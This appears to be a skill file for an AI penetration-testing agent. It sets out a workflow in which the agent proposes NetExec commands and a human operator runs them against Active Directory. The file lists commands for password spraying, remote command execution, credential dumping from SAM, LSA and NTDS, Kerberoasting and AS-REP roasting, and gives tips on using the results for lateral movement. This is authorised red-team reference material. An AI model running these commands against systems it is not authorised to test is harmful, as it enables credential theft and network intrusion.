---
name: netexec
description: Operator-assisted NetExec workflows for Active Directory enumeration, credential validation, and lateral movement
category: tools
tags: [active-directory, lateral-movement, credentials, operator-assisted]
---

# NetExec

Swiss army knife for Active Directory and network service exploitation. Successor to CrackMapExec. Supports SMB, LDAP, WinRM, MSSQL, SSH, RDP, and more for credential validation, enumeration, and command execution.

## When to Request

- When testing Active Directory environments for lateral movement
- To validate credentials across multiple protocols and hosts simultaneously
- For AD enumeration (users, groups, shares, GPOs)
- When executing commands across multiple Windows hosts

## Operator-Assisted Workflow

1. Agent identifies AD environment from recon (domain controllers, SMB signing, LDAP)
2. Agent provides NetExec commands for credential validation or enumeration
3. Operator runs NetExec and reports results (valid creds, accessible shares, command output)
4. Agent maps access paths and identifies lateral movement opportunities
5. Agent directs further exploitation based on discovered privileges

## Key Commands

### SMB Enumeration
```
nxc smb TARGET_RANGE --shares
nxc smb TARGET_RANGE --users
nxc smb TARGET_RANGE --groups
nxc smb TARGET_RANGE --sessions
nxc smb TARGET_RANGE --pass-pol
```

### Credential Validation
```
nxc smb TARGET -u USER -p PASSWORD
nxc smb TARGET -u USER -H NTLM_HASH
nxc smb TARGET_RANGE -u users.txt -p passwords.txt --continue-on-success
```

### Command Execution
```
nxc smb TARGET -u USER -p PASSWORD -x "whoami /all"
nxc smb TARGET -u USER -p PASSWORD -X "Get-ADUser -Filter *" --exec-method wmiexec
nxc winrm TARGET -u USER -p PASSWORD -x "whoami"
```

### Credential Dumping
```
nxc smb TARGET -u ADMIN -p PASSWORD --sam
nxc smb TARGET -u ADMIN -p PASSWORD --lsa
nxc smb TARGET -u ADMIN -p PASSWORD --ntds
```

### LDAP Enumeration
```
nxc ldap DC_IP -u USER -p PASSWORD --users
nxc ldap DC_IP -u USER -p PASSWORD --groups
nxc ldap DC_IP -u USER -p PASSWORD --gmsa
nxc ldap DC_IP -u USER -p PASSWORD --kerberoasting
nxc ldap DC_IP -u USER -p PASSWORD --asreproast
```

### MSSQL
```
nxc mssql TARGET -u USER -p PASSWORD -q "SELECT @@version"
nxc mssql TARGET -u USER -p PASSWORD --local-auth -q "SELECT * FROM master..syslogins"
```

## Output Analysis

- **Pwn3d!** -- admin access confirmed; can dump creds and execute commands
- **[+] valid credentials** -- access confirmed; test for privilege level and lateral movement
- **Accessible shares** -- enumerate for sensitive files, scripts, configs
- **Kerberoastable accounts** -- extract TGS hashes for offline cracking with Hashcat
- **ASREProastable accounts** -- extract AS-REP hashes for cracking without credentials

## Integration with Strix

- Credential validation results expand authenticated testing scope
- Extracted hashes feed into Hashcat/John for offline cracking
- Discovered shares and services expand Strix's web application scope
- AD enumeration data informs privilege escalation and lateral movement strategy
